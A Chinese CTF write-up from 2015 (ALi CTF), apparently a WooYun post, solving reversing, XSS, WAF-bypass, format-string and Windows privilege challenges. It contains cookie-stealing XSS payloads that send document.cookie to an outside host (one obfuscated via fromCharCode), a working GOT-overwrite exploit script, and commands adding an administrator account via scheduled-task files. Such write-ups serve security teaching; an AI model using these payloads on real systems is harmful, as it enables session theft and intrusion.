@@ -1,0 +1,260 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">ALi CTF 2015 write up</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">EvilMoon</a> <span class="bull">·</span> <time title="2015/04/03 15:03" ui-time="" datetime="2015/04/03 15:03" class="published ng-binding ng-isolate-scope">2015/04/03 15:03</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>Authors:</p><p>EM <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d0e03081b0401000202032d0a000c0401430e0200">[email&#160;protected]</a></p><p>Ricter <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6f1d060c1b0a1d15070a01082f08020e0603410c0002">[email&#160;protected]</a></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2015/04/%E9%99%84%E4%BB%B6.tar.gz">附件</a></p><h1>0x00 Cake</h1><hr><p>Cake 是一题 Android 题，具体流程就是一个输入一个字符串然后，初始化一个长度为16的数组，然后将字符串与这个数组 xor 。所以我们只需要再 xor 一下就 ok 了。</p><p>就是看代码逆向下，关键是有两个 Key 找对就 ok 直接上代码</p><pre><code>#!python
+a = [0, 3, 13, 19, 85, 5, 15, 78, 22, 7, 7, 68, 14, 5, 15, 42]
+b = 'bobdylan'
+s = ''
+i = 0
+for x in a:
+    s+= chr(x ^ ord(b[i % len(b)]))
+    i += 1
+print s
+</code></pre><h1>0x01 渗透绕过WAF1</h1><hr><p>2、绕过云 WAF1 是一题绕过 WAF 题，这个 WAF 写的很死，所以就要用其他办法咯～</p><p>通过打开的弹窗提示，需要在<code>.alictf.com</code>的子域下面做，于是 fuzz 子域名：</p><p><img alt="enter image description here" img-src="b95fd0335355e26369c4564409eb36b6d2e4405d.jpg"></p><p>得出<code>video.alictf.com</code>，打开发现没有 waf，注入点为<code>id</code>。</p><p><img alt="enter image description here" img-src="fcfb1981979a60b0e64ce593fdd0782ad52123ef.jpg"></p><h1>0x02 前端初赛题1</h1><hr><p>反射型 XSS，通过 ph 牛的<a href="http://www.leavesongs.com/PENETRATION/XDCTF-2014-Writeup.html">文章</a>，<code>&lt;svg&gt;</code>标签内<code>&lt;script&gt;</code>的内容可以 HTML encode，成功弹窗。</p><p><img alt="enter image description here" img-src="b714a78245ecd55ba188b4897b901341d0b36cf5.jpg"></p><p>之后 payload 如下：</p><pre><code>#!javascript
+var i = new Image();
+i.src = "http://ricter.me:9999/?" + document.cookie;
+</code></pre><p>得到 flag。</p><h1>0x03 密码宝宝</h1><hr><p>密码宝宝 一题逆向题，用了 upx 加壳。</p><p>用010editor打开后，可以看到加了upx壳，用upx –d脱壳</p><p><img alt="enter image description here" img-src="c48e89dd2838f50861ea88e55803ea0a2a11d932.jpg"></p><p>在ida中查找GetWIndowTextA调用的地方</p><p><img alt="enter image description here" img-src="32de1d92d06430764861119b31c18fd15cca222c.jpg"></p><p><img alt="enter image description here" img-src="9d9cdaefd54aabfaa393287d11e10c58c9aee23a.jpg"></p><p>Sub_405160这个函数就是进行判断的函数</p><p><img alt="enter image description here" img-src="ad7e7717de06650047070a887002d68c1e6cbc26.jpg"></p><p>可以看到逻辑比较简单，就是将”himemnl”的每一位与0x4c,0x5a,0x4b各异或一次，就可以得到密码“5408031”</p><h1>0x04 简单业务逻辑</h1><hr><p>简单业务逻辑 一题逻辑漏洞题～</p><p>注册账号，其中 Username 为<code>Admin</code>。</p><p><img alt="enter image description here" img-src="141f8c8280352d4d64fa252a1a31516e97613cae.jpg"></p><p>登录后买 -111 个草泥马：</p><p><img alt="enter image description here" img-src="0659e9378bfbb22c6a02e870cb30f3f230129e0c.jpg"></p><p>得到好多钱，然后买最贵的那个。</p><h1>0x05 前端初赛题2</h1><hr><p>前端初赛题2 简单来说就是给你一个 flash 让你弹弹弹</p><p>直接反编译得到 as 代码，首先可以知道 ExternalInterface.call 肯定是利用电，但是发现它会 delete 掉那些方法。找资料发现</p><pre><code>http://drops.wooyun.org/papers/948
+</code></pre><p>如果你需要将你的vector发送到藏在防火墙的后面受害者（flashvars­可以使用#来达到隐藏自己的目的）又或者想突破一些客户端的XSS防御机制这个方法将会十分的凑效。这一切都基于flash会丢弃一些被URL编码过的无效字符。</p><p>(1)flash会丢弃两个出现在%后面的无效十六进制字符（([^0-9a-fA-F])），比如：</p><pre><code>"%X" or "%="
+</code></pre><p>(2)如果在%后面出现一个有效和一个非有效十六进制字符，就会丢弃三个字符，比如：</p><pre><code>"%AX" or "%A&amp;"
+</code></pre><p>这样处理后就能 bypass 那个 delete 了，因为在 for 里时把 %X 带上了，最后在 call 的时候 flash 会丢弃这个</p><p>然后在用这篇文章里的方法</p><pre><code>http://drops.wooyun.org/tips/2924
+</code></pre><p>带上</p><pre><code>alert(1))}catch(e){alert(100)}//
+</code></pre><p>当然直接用弹不出来（血的教训，卡了好久，审查元素看了下发现语句不一样＝。＝ 所以最后可以这样弹</p><pre><code>#!javascript
+%Xdebug=\%22));alert(1);}catch(e){alert(100)}//
+</code></pre><p>最后 payload 如下</p><pre><code>#!javascript
+http://8dd25e24b4f65229.alictf.com/swf.swf?%Xdebug=\%22));eval(String.fromCharCode(101,118,97,108,40,34,118,97,114,32,120,61,110,101,119,32,73,109,97,103,101,40,41,59,120,46,115,114,99,61,39,104,116,116,112,58,47,47,52,53,46,53,53,46,49,51,53,46,49,51,57,47,120,46,112,104,112,63,99,111,111,107,105,101,61,39,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,34,41));}catch(e){alert(100)}//
+</code></pre><h1>0x06 渗透绕过WAF2</h1><hr><p>绕过云WAF2 题目显示说不在内网，所以第一步就是先设置一个内网 ip 咯 接下来看 writeup</p><p>提示需要内部访问，于是 fuzz IP：</p><ul><li>192.168.x.x</li><li>10.x.x.x</li><li>172.16.x.x</li></ul><p>发现 10 开头的 IP 可以访问。通过更改 HTTP 请求方法为 PATCH 可以让防护等级为中。<br>更改关键字，如<code>%20</code>改为<code>%0b</code>等绕过检测，注入得到 flag。</p><p><img alt="enter image description here" img-src="c05ab9739901328761ff1f28ec7e255e6903dd13.jpg"></p><h1>0x07 谁偷了你的站内短信</h1><hr><p>谁偷了你的站内短信 一题 binary 题</p><p>直接无脑 F5 ，可以看到 sendMail 直接 printf 了输入，所以就有一个 Format String 漏洞。</p><p>当然，要任意地址写得有个数据在栈上，然后发现用户名在栈上，再追一下栈上的数据，可以看到 76 的位置放着用户名，所以我可以任意地址写了。</p><p>然后本来还想怎么泄漏 libc 的地址什么的，结果再看看代码，那里躺着一个 print&#95;flag 。。。这下就简单了，发现在 sendMail 后返回后跟着三个 free ，我直接改 free 的 got 表，让他跳到 print&#95;flag 就行了，直接上代码。</p><pre><code>#!python
+#coding:utf-8
+from zio import *
+
+print_flag = 0x08048BBD
+free_addr = 0x0804C014
+
+exp = """%134515645x%76$hn"""
+
+io = zio(('exploit.alictf.com',5608))
+''' # 第一次注册要用这个
+io.read_until('Quit')
+io.writeline('1')
+io.read_until('Name:')
+io.writeline(l32(free_addr))
+io.read_until('ass:')
+io.writeline('1234')
+'''
+
+io.read_until('Quit')
+io.writeline('2')
+io.read_until('Name:')
+io.writeline(l32(free_addr))
+io.read_until('ass:')
+io.writeline('1234')
+io.read_until('Quit')
+io.writeline('3')
+io.read_until('To:')
+
+io.writeline(exp)
+''' # 这下面的去掉不然会超时，最后自己随便写就好了
+io.read_until('Title:')
+io.writeline('123')
+io.read_until('Body:')
+io.writeline('123')
+io.read_until('Quit')
+io.writeline('3')
+'''
+io.interact()
+</code></pre><h1>0x08 业务逻辑和渗透</h1><hr><p>先弄个正常的用户，找回密码，发现给了个地址</p><pre><code>http://jinan.alictf.com/resetpass/reset.php?pass_token=xxxxx
+</code></pre><p>想说这里的 token 可以控制就好了，再看重置密码的页面，发现底部有东西。</p><pre><code>testKey: 673f3e705c8d5b7af675f309e58d46c9
+ServerTime：15-03-29 20:46:03
+</code></pre><p>再想，token 明显是个 md5 那么会是怎么组的呢，首先这个 testKey 和 ServerTime 肯定会用到，但是总不可能每个人的 token 都一样，所以肯定还需要用户名，试了下发现是</p><pre><code>md5(username + testKey + serverTime(时间戳))
+</code></pre><p>然后就可以修改 admin 的密码了，但是。。说我异地登陆。尝试改 xff 、 xrealip 等头都不行。。。然后上网找了个 http 代理。。然后就。。就可以了。这题自带地域歧视！山东人直接能秒了啊！！！</p><h1>0x09 前端初赛题3</h1><hr><pre><code>#!javascript
+&lt;html&gt;
+&lt;head&gt;
+  &lt;script src='jquery.min.js'&gt;&lt;/script&gt;
+  &lt;script&gt;
+    function URL(url) {
+        this.url = url
+        this.illegal = false;
+
+        this.scheme = null
+        this.query = null;
+        this.fragment = null;
+        this.authority = '';
+        this.path = '';
+        this.username = null;
+        this.password = null;
+        this.port = 80;
+    }
+    URL.prototype.parse = function(){
+      var url = this.url
+
+      //parse fragment
+      var pos = url.indexOf('#');
+      if(pos &gt; -1){
+        if(url.length &gt; pos+1){
+          this.fragment = url.substr(pos+1, url.length-(pos+1));
+        }
+        url = url.substr(0, pos);
+      }
+      //parse query
+      pos = url.indexOf('?');
+      if(pos &gt; -1){
+        if(url.length &gt; pos+1){
+          this.query = url.substr(pos+1, url.length-(pos+1));
+        }
+        url = url.substr(0, pos);
+      }
+
+      //parse scheme
+      var pos1 = url.indexOf(':');
+      var pos2 = url.indexOf('/');
+      if(pos1 &gt; -1 &amp;&amp; pos2 &gt; pos1){
+        this.scheme = url.substr(0, pos1).toLowerCase();
+        url = url.substr(pos1+1);
+        if(url.substr(0,2) == '//'){
+          url = url.substr(2);
+        }else{
+          this.illegal = true;
+          return
+        }
+      }else{
+        this.illegal = true;
+        return
+      }
+
+      while(url.charAt(0) == '/'){
+        url = url.substr(1)
+      }
+
+      pos = url.indexOf('/')
+      if(pos == -1){
+        this.authority = url;
+        this.path = '';
+      }else{
+        this.authority = url.substr(0, pos);
+        this.path = url.substr(pos);
+      }
+
+      //parse username and password
+      pos = this.authority.indexOf('@');
+      if(pos == -1){
+        this.username = null;
+        this.password = null;
+      }else{
+        this.username = this.authority.substr(0, pos);
+        this.authority = this.authority.substr(pos+1);
+        pos = this.username.indexOf(':')
+        if(pos == -1){
+          this.password = null;
+        }else{
+          this.password = this.username.substr(pos+1);
+          this.username = this.username.substr(0, pos);
+        }
+      }
+
+      //parse port
+      pos = this.authority.indexOf(':');
+      if(pos &gt; -1){
+        this.port = this.authority.substr(pos+1);
+        this.authority = this.authority.substr(0, pos)
+      }
+    }
+    URL.prototype.validate = function(){
+      this.parse();
+
+      if(this.illegal) return;
+      //validate scheme
+      if(this.scheme != 'http' &amp;&amp; this.scheme != 'https'){
+        this.illegal = true;
+        return;
+      }
+      if(this.username &amp;&amp; this.username.indexOf('\\') &gt; -1){
+        this.illegal = true;
+        return;
+      }
+      if(this.password &amp;&amp; this.password.indexOf('\\') &gt; -1){
+        this.illegal = true;
+        return;
+      }
+      if(this.authority != 'notexist.example.com'){
+        this.illegal = true;
+        return;
+      }
+    }
+    URL.prototype.get = function(){
+      if(this.illegal){
+        return 'default.js';
+      }else{
+        return this.url;
+      }
+    }
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script type="text/javascript"&gt;
+    var url = new URL(location.search.substr(1));
+    url.validate()
+    url = url.get()
+    $.getScript(url)
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>读 JavaScript 代码，构造地址：</p><pre><code>http://ef4c3e7556641f00.alictf.com/xss.php?http://notexist.example.com:@notexist.example.com:@ricter.me:9999/  
+</code></pre><p>加载的 JavaScript 脚本和 XSS100 相同。</p><h1>0x10 简单业务逻辑2</h1><hr><pre><code>#!php
+&lt;!--
+  function encrypt($plain) {
+    $plain = md5($plain);
+    $V = md5('??????'); 
+    //var_dump($V);
+    $rnd = md5(substr(microtime(),11));
+
+    //var_dump(substr(microtime(),11)+mt_rand(0,35));
+    $cipher = '';
+    for($i = 0; $i &lt; strlen($plain); $i++) {
+        $cipher .= ($plain[$i] ^ $rnd[$i]);
+    }
+    $cipher .= $rnd;
+    $V .= strrev($V);
+    //var_dump($cipher);
+    for($i = 0; $i &lt; strlen($V); $i++) {
+        $cipher[$i] = ($cipher[$i] ^ $V[$i]);
+    }
+    //var_dump($cipher);
+    //var_dump($V);
+    return str_replace('=', '', base64_encode($cipher));
+}
+function decrypt($cipher) {
+    $V = md5('??????');
+    $cipher_1 = base64_decode($cipher);
+    //var_dump($cipher_1);
+    if (strlen($cipher_1)!=64){
+    return 'xx';
+    }
+
+    $V .= strrev($V);
+    $plain = $cipher_1;
+    //var_dump($cipher_1);
+    //var_dump($V);
+    for($i = 0; $i &lt; strlen($V); $i++) {
+        $plain[$i] = ($cipher_1[$i] ^ $V[$i]); 
+    }
+    $ran = substr($plain,32,32);
+    $plain = substr($plain,0,32);
+    //var_dump($plain);
+    for ($i = 0; $i &lt; strlen($ran); $i++) {
+    $plain[$i] = ($plain[$i] ^ $ran[$i]);
+    }
+    //var_dump($plain);
+    return $plain;
+}
+!&gt;
+</code></pre><p>读页面中的 PHP 代码，得到加密和解密算法。</p><ul><li><p>1.用户名 md5 后，与一个随机生成的 md5 XOR；</p></li><li><p>2.用户名 md5 加上 rnd md5 组成密文 1；</p></li><li><p>3.密文 1 和一个未知的 md5(V) . strrev(md5(V)) 进行 XOR；</p></li><li><p>4.最后组合密文返回；</p></li></ul><p>由此可知，前 32 位为：</p><pre><code>md5("Guest") ^ md5(rnd) ^ md5(V)
+</code></pre><p>后 32 位为：</p><pre><code>md5(rnd) ^ strrev(md5(V))
+</code></pre><p>如果想把前 32 位的用户名从 Guest 换成 Admin，则有：</p><pre><code>md5("Guest") ^ md5(rnd) ^ md5(V) ^ md5("Guest") ^ md5("Admin")
+</code></pre><p>所以最终结果写个 Python 脚本算即可&#95;(:з」∠)&#95;</p><p><img alt="enter image description here" img-src="47d5da268f7d45a2e6e0803d9b1816455aad2f2d.jpg"></p><p>登录后 Cookie 中有一个 serailize 的注入，过滤了括号，不过分分钟了..</p><p><img alt="enter image description here" img-src="2b82f3297cb591ff0d0cfee0b02333171d5db22b.jpg"></p><h1>0x11 渗透初赛题</h1><hr><p>就是给一个网站你渗透～</p><p>通过 URL 猜测注册的 URL 为更改<code>action</code>为<code>register</code>，之后前端修改绕过限制注册账号。</p><p><img alt="enter image description here" img-src="0deb5264b34ca956cadd93a4ae7657dc7eb21c9a.jpg"></p><p>修改头像处存在列目录漏洞，发现网站备份文件。</p><p><img alt="enter image description here" img-src="8dc00e325c7b7e94685d0fcd460aeca97ae00eca.jpg"></p><p>进入后台地址，通过万能密码绕过。其中第一层无名之盾绕过方式为 mul 表单绕过，第二层直接<code>or{x 1}#</code></p><p><img alt="enter image description here" img-src="e54f306ad585318b2496b1c98d4fae2e7cf35915.jpg"></p><p>代码审计得到 user_bak 函数处存在一个二次注入漏洞（about 那里）。</p><p><img alt="enter image description here" img-src="b0a45dae9637da39cd925cf4deaaa9fcadf72e8b.jpg"></p><p>得到超级管理员密码，为 h4xxxx!@#。</p><p>然后我要吐槽了：</p><p>这个题虽然出的不错，但是最后这点真的是为了出题而出题了。ADS 能想到，新建文件夹也能想到，但是那个 admin&#95;pic 真是要开脑洞的。最后队友 eee 做出来了，大概是先 ADS 的 ::INDEX&#95;ALLOCATION 新建文件夹，然后改 admin_pic 的 Cookie，再用 ::$DATA 上传 php 文件。</p><h1>0x12 题目名称：宙斯盾</h1><hr><p>题目描述：你的当前token为 27638e649e4371f54eddb9a201f1b78c</p><p>服务器：ageis.alictf.com</p><p>请设法在服务器上新建一个以参赛者账号昵称为名字的管理员组账号.</p><p>创建成功后，访问 http://ageis.alictf.com，若能看到 “昵称:字符串”格式的内容，</p><p>则将 字符串 和你的 token 拼接即为flag。</p><pre><code>A. 服务器上有一个账号叫 alictf，为弱密码。
+B. 操作系统版本为 win2003 x64。
+C. 本机已开启VPN服务。
+D. 为了避免影响他人做题，在服务器上所有操作都不会真实成功的，只会完整记录。
+E. 请不要对参赛服务器发起攻击，我们会记录，轻则屏蔽参赛者IP，重则取消比赛资格。
+</code></pre><p>题目很明显就是要你登陆 VPN 。手工测试</p><pre><code>alictf:123456
+</code></pre><p>直接登录。 ifconfig 看一下， ip 是 172.16.0.1 扫了下端口，就开了 80 445 1025 1723 3389 没什么好想的 3389 肯定上不去，也不太可能是 snmp 直接 smb 那边考虑下，本来想无脑 msf 直接打，结果发现死活不成功，然后看了下官方的 tips 让我们好好看有存在什么文件，发现有两个文件，是 windows 计划任务文件夹下的文件， 即目录为</p><pre><code>c:\windows\tasks
+</code></pre><p>一开始 at 一直不成功，就想说是不是因为没写路径，然后就一直测试</p><pre><code>at \\172.16.0.1 xx:xx c:\windows\tasks\server.exe
+</code></pre><p>妄图执行一个远控，但是屡屡失败，然后看官方的描述</p><pre><code>为了避免影响他人做题，在服务器上所有操作都不会真实成功的，只会完整记录。
+</code></pre><p>考虑既然都不会执行，那要远控干嘛。。所以直接执行命令好了！但是，人生最精彩的就在这个但是，这样执行命令也是不行的！！！那怎么办回归原始，既然这个是个计划任务的文件夹，那我直接把 job 文件复制进去好了，但是其实按理说不行，因为计划任务和注册表有些版本是有关联的，但是比赛嘛，不管那么多了，先本地执行</p><pre><code>at xx:xx "net user eee password /add &amp;&amp; net localgroup administrators eee /add"
+</code></pre><p>这样会在 c:\windows\tasks\ 目录生成一个 job 文件，那么我如果把这个文件复制进去是不是就能生成一个计划任务呢？Just do it</p><pre><code>copy At1.job \\172.16.0.1\\Tasks\
+</code></pre><p>复制进去，以防万一我弄了 At2.job 和 At65535.job 然后等待服务器执行！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">低调的Y哥</span> <span class="reply-time">2015-04-20 13:31:48</span></div><p></p><p>弱菜求问or{x 1}是怎么绕过的，没见过这种姿势啊。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-04-04 09:05:41</span></div><p></p><p>本想等阿里的奖品发了再发writeup到drops的，被你抢先了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">′ 雨。</span> <span class="reply-time">2015-04-03 21:09:22</span></div><p></p><p>咋感觉是没写完的样子。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">d3pT1</span> <span class="reply-time">2015-04-03 15:27:21</span></div><p></p><p>真是实战啊！！！</p><p></p></div></div></div></div></div></main>
